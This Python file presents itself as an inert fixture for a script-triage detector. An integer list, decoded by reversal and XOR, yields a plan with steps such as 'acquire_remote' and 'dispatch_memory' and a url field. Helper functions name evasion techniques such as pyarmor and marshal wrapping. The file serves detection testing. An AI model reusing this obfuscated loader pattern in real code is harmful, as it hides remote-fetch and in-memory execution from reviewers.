# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_31851493 = [63, 205, 60, 56, 99, 98, 202, 56, 56, 52, 116, 144, 102, 105, 36, 34, 174, 122, 114, 53, 41, 138, 103, 116, 24, 102, 138, 103, 100, 55, 58, 161, 123, 100, 35, 46, 130, 112, 113, 126, 61, 202, 109, 103, 52, 105, 201, 109, 46, 52, 50, 146, 104, 119, 62, 50, 208, 108, 109, 32, 54, 159, 113, 100, 126, 63, 205, 60, 56, 99, 98, 202, 56, 56, 52, 116, 209, 51, 114, 32, 47, 138, 97, 60, 60, 41, 139, 117, 101, 99, 110, 199, 58, 56, 100, 106, 199, 109, 44, 62, 60, 151, 104, 113, 61, 58, 157, 52, 101, 57, 4, 144, 110, 104, 49, 43, 147, 104, 98, 44, 53, 145, 97, 117, 41, 43, 161, 102, 117, 15, 47, 142, 96, 115, 51, 40, 137, 52, 111, 57, 58, 150, 106, 94, 35, 44, 145, 109, 111, 57, 44, 130, 109, 100, 36, 58, 157, 122, 116, 54, 57, 145, 86, 115, 63, 54, 140, 104, 120, 32, 102, 140, 108, 104, 34, 41, 159, 106, 125, 62, 58, 146, 121, 94, 53, 43, 145, 101, 100, 38, 53, 155, 86, 109, 49, 51, 141, 123, 96, 61, 102, 144, 102, 104, 36, 58, 157, 122, 116, 54, 57, 145, 117, 111, 63, 50, 141, 122, 100, 34, 43, 134, 108, 94, 62, 52, 151, 125, 113, 53, 56, 134, 108, 60, 40, 58, 138, 103, 120, 35, 39, 207, 52, 117, 62, 46, 145, 106, 94, 53, 60, 159, 125, 114, 44, 34, 140, 102, 108, 53, 54, 161, 108, 109, 41, 47, 141, 86, 114, 36, 40, 155, 124, 112, 53, 41, 195, 123, 100, 36, 43, 159, 109, 96, 44, 34, 140, 102, 108, 53, 54, 161, 97, 98, 36, 58, 142, 122, 104, 52, 119, 155, 125, 110, 61, 62, 140, 86, 100, 34, 50, 139, 120, 98, 49, 102, 141, 121, 100, 36, 40, 130, 59, 60, 38]
CODEC_31851493 = "reversed_integer_list|repeating_key_xor|50,01,09,fe,5b"

def load_31851493():
    return bytes(reversed(MATERIAL_31851493))

def decode_31851493(e):
    key_bytes = (80, 1, 9, 254, 91,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

def recover_31851493():
    n = (3, 5, 8, 13)[1:3]
    for _pass in range(1):
        d = decode_31851493(load_31851493())
    t = d.decode("ascii", "strict")
    return t

def inspect_31851493():
    return recover_31851493()

def surface_31851493():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_31851493():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_31851493():
    fields = dict(item.split("=", 1) for item in inspect_31851493().split("|"))
    analysis_surface = surface_31851493()
    obfuscation_surface = obfuscation_31851493()
    operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_31851493())

# reconstruction complete